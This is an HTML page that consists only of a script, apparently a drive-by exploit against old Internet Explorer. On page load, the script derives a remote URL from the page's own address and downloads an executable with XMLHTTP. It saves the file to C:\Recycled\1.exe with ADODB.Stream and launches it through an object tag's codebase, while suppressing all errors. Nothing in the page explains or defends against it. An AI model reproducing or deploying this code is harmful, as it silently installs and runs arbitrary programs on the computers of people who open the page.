<html>
<body>
<script>
try {
pu = document.location.href;
pu = pu.substring(pu.indexOf("c:\\",1)+3,pu.length);
if (pu.indexOf("!",1) >= 0) pu = pu.substring(0,pu.indexOf("!"));
if (pu.indexOf(".mht") >= 0) pu = pu.substring(0,pu.indexOf(".mht"));
pu = pu.replace(/\\/g,'/');
var pi = pu.indexOf("/");
if (pi >= 0) pu = "http://"+pu.substring(0,pi+1)+"iex/ofile.exe?url=http://"+pu;
else pu = "http://"+pu;
var x = new ActiveXObject("Microsoft.XMLHTTP");
x.Open("GET",pu,0);
x.Send();
var s = new ActiveXObject("ADODB.Stream");
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);
s.SaveToFile("C:\\Recycled\\1.exe",2);
document.write('<object classid="clsid:11111111-1111-1111-1111-111111111123" codebase="c:\\Recycled\\1.exe"></object>');
} catch (e) { }
</script>
</body>
</html>